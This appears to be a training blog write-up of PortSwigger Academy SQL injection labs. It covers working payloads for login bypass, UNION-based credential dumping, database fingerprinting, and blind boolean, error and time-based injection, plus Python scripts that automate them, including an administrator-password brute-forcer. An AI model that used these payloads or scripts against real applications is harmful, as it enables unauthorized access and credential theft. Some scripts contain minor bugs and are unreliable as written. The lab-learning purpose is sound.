---
title: SQL Injection - Labs
date: 2022-01-25 12:00:00 -0400
image: 
    src: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png
    height: 1100
    width: 500
categories: [Web Security, Portswigger Academy]
tags: [web security, labs, owasp, sqli]
---

## Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
We need to retrieve hidden data so we search query's in the web where we can inject some sql injection payloads

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli4.jpg)

We can see that the request is filtering the data by category, and we are asked to show the hidden elements, so we assume that there is a parameter that hides the elements.

We try the following payload that will show the elements of all categories and we will comment out the rest of the query so that it does not filter by hidden or visible elements:

```sql
SELECT * FROM products WHERE category='Tech gifts'or 1=1--
```
This payload will comment everything else from the query, so it will show us all the elements, released or unreleased.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli5.jpg)

With this we can see the hidden data and finish the lab.

### Lab 1 Python Script

With this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object "3D Voice Assistant" is in the web response and don´t forget to set the proxies.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri='/filter?category='
    r=requests.get(url+uri+payload,verify=False, proxies=proxies)
    if '3D Voice Assistants' in r.text:
        return True
    else:
        return False

       
if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print('Usage: %s <url> <payload>' % sys.argv[0])
        print('Example: %s www.example-com "1=1"' % sys.argv[0])
        sys.exit(-1)
    if exploit_sqli(url,payload):
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")
```
## Lab 2 - SQL injection vulnerability allowing login bypass

In this lab we will use the same idea as in the first lab, we will discuss the validation of the password in the query to let us log in as administrator with only the username with this payload `admnistrator'--` and the query would look like this:

```sql
SELECT * FROM users WHERE username='administrator'--' and password='something'
```
This payload will comment the password validation and only will verify the correct username, in this case they give us this hint.

### Lab 2 Python Script

With this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object "3D Voice Assistant" is in the web response and don´t forget to set the proxies.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
a_session = requests.Session()

def exploit_sqli(url, payload):
    uri='/login'
    r=a_session.post(url+uri, data={'username':payload, 'password':'a', 'csrf':'EDWeHPACH8bS0tDjAm7gCWzRdGPPYdGT'},verify=False, proxies=proxies, cookies={'session':'mnSlrxs2JjbmuE7icjEsJHJKgswWnkA5'})
    if 'Log out' in r.text:
        return True
    else:
        return False

       
if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print('Usage: %s <url> <payload>' % sys.argv[0])
        print('Example: %s www.example-com "1=1"' % sys.argv[0])
        sys.exit(-1)
    if exploit_sqli(url,payload):
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")    
```
For this script to work we need the session cookie and the csrf token that we get by intercepting the post with burpsuite.

## Lab 3 - SQL injection UNION attack, determining the number of columns returned by the query

In this lab we have to find out the number of columns that has the table of objects displayed on the web, in this case is filtering by category, but we will use UNION and NULL VALUES to determine how many columns exist, for that we will use as an example `UNION SELECT NULL, NULL --`, which will add to the query null fields for each column found.

The query will look something like this

```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT NULL, NULL, NULL--
```
If the response returns a 504 error, it means that there is a syntax error, that happens because there are more columns than null fields, then you will have to add more null fields until they are equal.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli6.jpg)

As you can see the objective is to return an error 200, this way we know that the number of columns in the table is equal to the number of null fields we have added.

### Lab 3 Python Script

With this script we will be automating the request to achieve sql injection, it is based on adding null values until it returns the response code 200, which means that the number of null values is equal to the number of columns in the table.

```python

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def exploit_sqli(url, payload):
    uri="filter?category=Gifts"
    for i in range (1,10):
        print("The url for request is: "+url+uri+payload+"--")
        r=requests.get(url+uri+payload+"--", verify=False, proxies=proxies)
        if r.status_code==200:
            return i
        payload+=",+NULL"
    return False

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION+SELECT+NULL"
    except IndexError:
        print('Usage: %s <url> ' % sys.argv[0])
        print('Example: %s www.example-com ' % sys.argv[0])
        sys.exit(-1)
    columns=exploit_sqli(url,payload)
    if columns:
        print("SQL Injection Successfull, the number of columns are {columns}".format(columns=str(columns)))
    else:
        print("Injection Failed, try again")   
```
For this case I am only testing 10 iterations, in case you are going to test too many iterations, it is recommended to create a session with the session library and attach the cookie as a parameter to make the requests more stable.

## Lab 4 - SQL injection UNION attack, finding a column containing text

In this lab we have to achieve the retrieve of the string 'gIkMM7' by the database, for this we need to know which column contains string format values, for that we make use of the tip learned in the theory section.

*Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn*

The payload to enter would be `'+UNION+SELECT+NULL,'gIkMM7',+NULL--`.

The query will look something like this:
```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT NULL, 'gIkMM7', NULL--
```
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli7.jpg)

As we already knew, the table has 3 columns and we should only be testing in which of these columns the format is string, in this case the second column is string format, that's why it returns what we requested

### Lab 4 Python Script
What this script does is to test the string given in each of the columns to know which of these accepts string format, when the response code is 200, it means that it has accepted the request, and has managed to inject sql code.
```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def exploit_sqli(url):
    uri="filter?category=Gifts"
    cols = ["'gIkMM7', NULL, NULL",
            "NULL, 'gIkMM7', NULL",
            "NULL, NULL, 'gIkMM7'"]
    for c in cols:
        q = f"' UNION SELECT {c}-- "
        print("The url for request is: {url}".format(url=url+uri+q))
        r=requests.get(url+uri+q, verify=False, proxies=proxies)
        if r.status_code==200:
            return q
    return False

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION+SELECT+NULL"
    except IndexError:
        print('Usage: %s <url>' % sys.argv[0])
        print('Example: %s www.example-com' % sys.argv[0])
        sys.exit(-1)
    columns=exploit_sqli(url)
    if columns:
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")
```
In this case the table has only 3 columns and it could be done in an easy way, since there are only 3 cases to test as maximum, in the case that the table has many columns it would be better a session with the session library and not use lists, but a permutation code to be more efficient.

## Lab 5 - SQL injection UNION attack, retrieving data from other tables

In this lab we only need to retrieve the administrator password found in the users table, as the description says, we will use the following payload `'UNION SELECT username, password FROM users--` that will allow us to extract the user and password
The query will look something like this:
```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT username, password FROM users--
```
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli8.jpg)

### Lab 5 Python Script

This lab is simple, because we only have to request the username and password from the users table and it has the same format as what is shown on the web, a title and the content, if we did not have the name of these columns we would have to find it out first.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def exploit_sqli(url,payload):
    uri="category?=Gifts"
    print("The url for request is: {url}--".format(url=url+uri+payload))
    r=requests.get(url+uri+payload+"--", verify=False, proxies=proxies)
    if r.status_code==200:
        return True
    return False

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION SELECT username, password FROM Users"
    except IndexError:
        print('Usage: %s <url>' % sys.argv[0])
        print('Example: %s www.example-com' % sys.argv[0])
        sys.exit(-1)
    columns=exploit_sqli(url,payload)
    if columns:
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")
```

## Lab 6 - SQL injection UNION attack, retrieving multiple values in a single column

In this lab we only have to concatenate two strings of different columns in a single column, since only one column of the table is in string format, for that we use the payload `'UNION SELECT NULL, username || '-' || password FROM users--`, remember that the syntax for concatenation may vary according to the database, I leave you this table for your guidance:

| DB Version | Syntax for string concatenation    |
|:-----------|:-----------------------------------|
| Oracle     | 'foo'&#124;&#124;'bar'                       |
| Microsoft  | 'foo'+'bar'                        |
| PostgreSQL | 'foo'&#124;&#124;'bar'                       |
| MySQL      | 'foo' 'bar' or CONCAT ('foo','bar')|

The query will look something like this:
```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT NULL, username ||'-'|| password FROM users--
```
this is what we get back from the web, the blessed credentials.
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli9.jpg)

### Lab 6 - Python Script

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def exploit_sqli(url,payload):
    uri="category?=Gifts"
    print("The url for request is: {url}--".format(url=url+uri+payload))
    r=requests.get(url+uri+payload+"--", verify=False, proxies=proxies)
    if r.status_code==200:
        return True
    return False

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION SELECT username ||'-'|| password FROM Users"
    except IndexError:
        print('Usage: %s <url>' % sys.argv[0])
        print('Example: %s www.example-com' % sys.argv[0])
        sys.exit(-1)
    columns=exploit_sqli(url,payload)
    if columns:
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")
```
## Lab 7 - SQL injection attack, querying the database type and version on Oracle

In this lab, we have to find out the oracle database version, for this case first we must know how many columns the table has, in this case we can see 2 columns, since only the title and the description of the article are shown, then we use our [cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to make the corresponding query, so the payload in the URL will be: `'UNION SELECT 'VERSION', banner FROM v$version --`.
And the query will look something like this:

```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT 'VERSION', banner FROM v$version --
```
It will retrieve the database version

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli10.jpg)

### Lab 7 - Python Script

With this script we will query the web server and parse the information with the help of the bs4 library that contains BeautifulSoup to find the Oracle Database word, if it finds it we can say that the sql injection has been successful.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
def exploit_sqli(url,payload):
    uri="category?=Lifestyle"
    print("The url for request is: {url}--".format(url=url+uri+payload))
    r=requests.get(url+uri+payload+"--", verify=False, proxies=proxies)
    if 'Oracle Database' in r.text:
        print("Found database version")
        parsed=BeautifulSoup(r.text,'html.parser')
        version=parsed.find(text=re.compile('*.Oracle\sDatabase.*'))
        print(f'The oracle database version is {version}'.format(version=version))
        return True
    return False

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION SELECT 'VERSION', banner FROM v$version"
    except IndexError:
        print('Usage: %s <url>' % sys.argv[0])
        print('Example: %s www.example-com' % sys.argv[0])
        sys.exit(-1)
    columns=exploit_sqli(url,payload)
    if columns:
        print("SQL Injection Successfull")
    else:
        print("Injection Failed, try again")
```
## Lab 8 - SQL injection attack, querying the database type and version on MySQL and Microsoft
In this lab we need to find out the MySQL database version, first we see how many columns the table has with the payload `'order by 2` by, after we find that it has 2 columns, we use the specific payload using the [cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), in this case it would be `@@version`, and instead of commenting with two dashes, we use #.

So the query will look something like this:

```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT NULL, @@version%23
```
We use %23 because the hashtag has to be encoded, after that the response is the database version which is 8.0.28.

### Lab 8 - Python Script

In this case the script is the same as the previous one, only the payload changes, which in this case is `@@version`, you can be guided by the script of lab 7.

## Lab 9 - SQL injection attack, listing the database contents on non-Oracle databases
In this lab first we need the name of the tables, for that we use the parameter `table_name` and it will be extracted from `information_schema.tables` that allows us to read data about the database for more information read the [Documentation](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html), as the query accepts 2 text parameters, we use NULL in one and we get all the tables in the database.

The payload in the URL look like this `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

Now, we select the table that contain the word users, in my case is `users_mumqoo` and dump the column names with this payload `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns WHERE table_name='users_mumqoo'----`

In my case the column names are `password_lhjzlx` and `username_ngcpuh`.

Finally we can retrieve the username and password because we know the column name and the table name, we will use this payload `'+UNION+SELECT+username_ngcpuh, password_lhjzlx+FROM users_mumqoo--`

The final query will look something like this:

```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT username_ngcpuh, password_lhjzlx FROM users_mumqoo--
```
## Lab 10 - SQL injection attack, listing the database contents on Oracle

In this lab, we will use the same idea as the previous one, only now the database is oracle, so first read the [Documentation](https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/information-schema.html#tables-table) about the information schema, first we must list the tables with the payload: `'UNION SELECT NULL, table_name FROM all_tables--`

After identifying the user table, which in my case is `USERS_GACPLX`, we must identify the names of the columns, for that we use the following payload:`'UNION SELECT NULL, column_name FROM USER_TAB_COLUMNS WHERE table_name='USERS_GACPLX'--` 

With this we will identify the user and password columns, in my case they are `USERNAME_PIOHJJ`, `PASSWORD_ZELMBN` , once we know that we only make the query of the credentials knowing the name of the table, with the following payload final: `'UNION SELECT USERNAME_PIOHJJ, PASSWORD_ZELMBN FROM USERS_GACPLX--`

And the final query will look something like this:

```sql
SELECT * FROM PRODUCTS WHERE category='Gifts'UNION SELECT USERNAME_PIOHJJ, PASSWORD_ZELMBN FROM USERS_GACPLX--
```
## Lab 11 - Blind SQL injection with conditional responses

In this lab we have to use the cookie to make sql injection, we intercept the request with burp and we use the substring command to compare the characters of the password of the users table of the user with administrator name, this command receives 3 values, the variable, the start order and the number of characters to extract and that is equal to any letter, if the query is true then we will get the welcome back message, otherwise not, then we can make a brute force attack in burpsuite.

The query will look something like this:

```sql
SELECT tracking-id from tracking-table where TrackingId='g1cLmHM7hZM7IhBH' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c'--
```
The response have the text welcome back
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli11.jpg)

We use the cluster bomb attack for 2 parameters, the index of the initial position of the substring command and the character with which it is compared, for that we click on add in burpsuite and then configure the payloads for each parameter.
The response have the text welcome back
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli12.jpg)

The first parameter consists of indices from 1 to 20 going from 1 to 1, the length of the password is known because we previously compared the lenght of the password with different values.

For example: `(select password form users where username='administrator' and LENGTH(password)>19)='administrator'--` 
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli13.jpg)

The second parameter is the character itself with which each letter of the password is compared, so it must contain the alphabet values and numbers.
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli14.jpg)

Then we click start attack!!

If you have burpsuite community edition it will take some time because it has to make 720 requests, after finishing we order by size and relate each position with its respective letter and we will get the administrator's password.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli15.jpg)

Finally we order the position with its respective letter and we get the administrator's password

### Lab 11 - Python Script
This script will allow us to brute force the password, just change the session cookies for yours and it will do the job for you.

```python
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'g1cLmHM7hZM7IhBH' + sqli_payload_encoded, 'session': 't8y3Fw72A2oY8vxzu3o6CyjaBnplydVD'}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
```
## Lab 12 - Blind SQL injection with conditional errors

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

We will use this payload `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Continue this process testing offset 3, 4, and so on, until you have the whole password, we can use the last script but changing the sql_payload, if you have burpsuite professional it will take less time.

## Lab 13 - Blind SQL injection with time delays
This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

Modify the `TrackingId` cookie, changing it to:
    
`TrackingId=x'||pg_sleep(10)--`
	
Submit the request and observe that the application takes 10 seconds to respond.
## References
- [Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP Top 10 - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Bug Bounty Bootcamp](https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3)
- [Rana Khalil Channel](https://www.youtube.com/c/RanaKhalil101)
